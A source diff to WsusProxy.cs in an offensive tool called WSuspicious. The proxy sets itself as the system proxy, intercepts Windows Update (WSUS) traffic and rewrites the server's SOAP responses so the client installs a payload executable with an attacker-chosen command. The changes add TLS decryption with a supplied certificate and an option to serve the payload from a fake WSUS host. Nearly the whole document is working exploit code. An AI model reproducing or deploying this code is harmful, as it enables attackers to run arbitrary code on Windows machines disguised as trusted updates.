@@ -4,6 +4,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Xml.Linq;
@@ -11,9 +12,9 @@ using Titanium.Web.Proxy;
 using Titanium.Web.Proxy.EventArguments;
 using Titanium.Web.Proxy.Exceptions;
 using Titanium.Web.Proxy.Models;
-using Titanium.Web.Proxy.Network;
+using WSuspicious.Utility;
 
-namespace WSuspicious.Proxy
+namespace WSuspicious.Servers.Proxy
 {
     class WsusProxy : IDisposable
     {
@@ -39,19 +40,26 @@ namespace WSuspicious.Proxy
         private readonly bool isDebug;
         private readonly string wsusHost;
 
+        private readonly string fakeWSUSHost;
+
         private readonly string executedCommand;
 
-        public WsusProxy(string wsusHost, byte[] payload, string payloadExecutableName, string executedCommand) : this(wsusHost, payload, payloadExecutableName, executedCommand, false)
-        { }
+        private readonly X509Certificate2 genericCert;
 
-        public WsusProxy(string wsusHost, byte[] payload, string payloadExecutableName, string executedCommand, bool debug)
+        public WsusProxy(string wsusHost, byte[] payload, string payloadExecutableName, string executedCommand) : this(wsusHost, payload, payloadExecutableName, executedCommand, false) { }
+
+        public WsusProxy(string wsusHost, byte[] payload, string payloadExecutableName, string executedCommand, bool debug) : this(wsusHost, payload, payloadExecutableName, executedCommand, debug, null, null) { }
+
+        public WsusProxy(string wsusHost, byte[] payload, string payloadExecutableName, string executedCommand, bool debug, string fakeWSUSHost, X509Certificate2 cert)
         {
             this.isDebug = debug;
             this.wsusHost = wsusHost;
             this.payload = payload;
             this.payloadExecutableName = payloadExecutableName;
             this.executedCommand = WebUtility.HtmlEncode(WebUtility.HtmlEncode(executedCommand));
-            
+
+            this.fakeWSUSHost = fakeWSUSHost;
+
             using (var cryptoProvider = new SHA1CryptoServiceProvider())
             {
                 this.payloadSHA1 = Convert.ToBase64String(cryptoProvider.ComputeHash(payload));
@@ -70,14 +78,10 @@ namespace WSuspicious.Proxy
             this.deploymentID2 = rnd.Next(80000, 99999);
             this.uuid1 = Guid.NewGuid().ToString();
             this.uuid2 = Guid.NewGuid().ToString();
+            this.genericCert = cert;
 
             // Setup the proxy
             proxyServer = new ProxyServer(false, false, false);
-
-            // We dont care about the certificate engine since we do not support HTTPS.
-            // so we will change it to avoid including BouncyCastle in the binary and reduce its size.
-            proxyServer.CertificateManager.CertificateEngine = CertificateEngine.DefaultWindows;
-            proxyServer.CertificateManager.CertificateStorage = new InMemoryCertificateCache();
 
             // Silent all exceptions and ensure we never crash and cause DoS
             proxyServer.ExceptionFunc = async exception =>
@@ -113,11 +117,16 @@ namespace WSuspicious.Proxy
             // Fired when a CONNECT request is received
             explicitEndPoint.BeforeTunnelConnectRequest += onBeforeTunnelConnectRequest;
 
+            if (this.genericCert != null)
+            {
+                explicitEndPoint.GenericCertificate = genericCert;
+            }
+
             // An explicit endpoint is where the client knows about the existence of a proxy
             // So client sends request in a proxy friendly manner
             proxyServer.AddEndPoint(explicitEndPoint);
             proxyServer.Start();
-        
+
             foreach (var endPoint in proxyServer.ProxyEndPoints)
             {
                 Console.WriteLine("Listening on '{0}' endpoint at Ip {1} and port: {2} ", endPoint.GetType().Name,
@@ -125,7 +134,7 @@ namespace WSuspicious.Proxy
             }
 
             // Set us as the new proxy
-            proxyManager.setProxy("127.0.0.1", listenPort);
+            proxyManager.setProxy("127.0.0.1", listenPort, (this.genericCert != null));
         }
 
         public void Stop()
@@ -156,7 +165,15 @@ namespace WSuspicious.Proxy
                 e.HttpClient.UpStreamEndPoint = new IPEndPoint(clientLocalIp, 0);
             }
 
-            e.DecryptSsl = false;
+            // We want to intercept TLS requests if they are going to the WSUS server
+            if (!hostname.Contains(wsusHost) || this.genericCert == null)
+            {
+                e.DecryptSsl = false;
+            }
+            else
+            {
+                e.DecryptSsl = true;
+            }
         }
 
         // intercept & cancel redirect or update requests
@@ -171,7 +188,7 @@ namespace WSuspicious.Proxy
             string hostname = e.HttpClient.Request.RequestUri.Host;
 
             await writeDebugToConsole("Active Client Connections:" + ((ProxyServer)sender).ClientConnectionCount);
-            await writeDebugToConsole(e.HttpClient.Request.Url);
+            await writeDebugToConsole(String.Format("{0} {1}", e.HttpClient.Request.Method, e.HttpClient.Request.Url));
 
             // We inject into the WSUS dance
             if (hostname.Contains(wsusHost))
@@ -190,6 +207,12 @@ namespace WSuspicious.Proxy
                         await writeToConsole("---- Got request for stage 2 ----");
                         flagStep = 2;
                     }
+
+                    await writeDebugToConsole("");
+                    await writeDebugToConsole("========================================================");
+                    await writeDebugToConsole(" REQUEST                                                ");
+                    await writeDebugToConsole("========================================================");
+                    await writeDebugToConsole(requestBody);
                 }
                 else if (e.HttpClient.Request.RequestUri.AbsoluteUri.Contains(".exe"))
                 {
@@ -200,7 +223,7 @@ namespace WSuspicious.Proxy
                 }
             }
         }
-        
+
         private async Task onResponse(object sender, SessionEventArgs e)
         {
             await writeDebugToConsole("Active Server Connections:" + ((ProxyServer)sender).ServerConnectionCount);
@@ -218,11 +241,9 @@ namespace WSuspicious.Proxy
                         {
                             XDocument doc = XDocument.Load(stream);
 
-                            await writeDebugToConsole(doc.ToString());
-
                             var syncUpdatesResult = from p in doc.Descendants()
-                                                where p.Name.LocalName == "SyncUpdatesResult"
-                                                select p;
+                                                    where p.Name.LocalName == "SyncUpdatesResult"
+                                                    select p;
 
                             if (syncUpdatesResult.Count() > 0 && e.HttpClient.Response.StatusCode == (int)HttpStatusCode.OK)
                             {
@@ -241,10 +262,16 @@ namespace WSuspicious.Proxy
 
                                 // Small hack to handle the namespace during the XML merges above
                                 string returnedBody = doc.ToString(SaveOptions.DisableFormatting).Replace("<NewUpdates xmlns=\"\">", "<NewUpdates>");
-                                
+
                                 e.SetResponseBodyString(returnedBody);
 
                                 await writeToConsole("---- First stage on the way ----");
+
+                                await writeDebugToConsole("");
+                                await writeDebugToConsole("========================================================");
+                                await writeDebugToConsole(" RESPONSE                                               ");
+                                await writeDebugToConsole("========================================================");
+                                await writeDebugToConsole(returnedBody);
                             }
                         }
 
@@ -256,7 +283,16 @@ namespace WSuspicious.Proxy
 
                         if (soapActionHeaders.Count > 0 && soapActionHeaders[0].Value.Contains("GetExtendedUpdateInfo"))
                         {
-                            string payloadURL = String.Format("http://{0}:8530/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe", wsusHost);
+                            string payloadURL;
+                            if (String.IsNullOrEmpty(fakeWSUSHost))
+                            {
+                                payloadURL = String.Format("http://{0}:8530/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe", wsusHost);
+                            }
+                            else
+                            {
+                                payloadURL = String.Format("http://{0}/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe", fakeWSUSHost);
+                            }
+
                             string secondPhaseTemplate = ResourceHandler.ExtendedUpdateInfoTemplate;
                             secondPhaseTemplate = String.Format(secondPhaseTemplate,
                                 updateID2,
